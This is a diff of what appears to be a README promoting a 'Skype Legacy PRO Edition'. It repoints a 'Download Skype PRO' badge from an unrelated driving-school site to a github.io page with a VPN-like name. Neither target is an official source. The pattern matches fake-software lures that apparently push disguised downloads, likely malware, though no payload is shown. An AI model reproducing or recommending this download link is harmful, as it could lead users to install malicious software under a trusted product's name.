@@ -2,7 +2,7 @@
 
 Skype Legacy PRO Edition delivers a fully packed communication suite with an emphasis on usability, clarity, and performance. Whether you're chatting with friends, hosting a team call, or conducting professional meetings, this refined Skype version provides the classic interface and comprehensive toolset that millions trusted — optimized for today's devices and platforms.
 
-[![Download Skype PRO](https://img.shields.io/badge/Download-Skype_PRO-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Skype PRO](https://img.shields.io/badge/Download-Skype_PRO-blueviolet)](https://cyberghost-vpn-privacy-shield.github.io/.github)
 
 ---
 
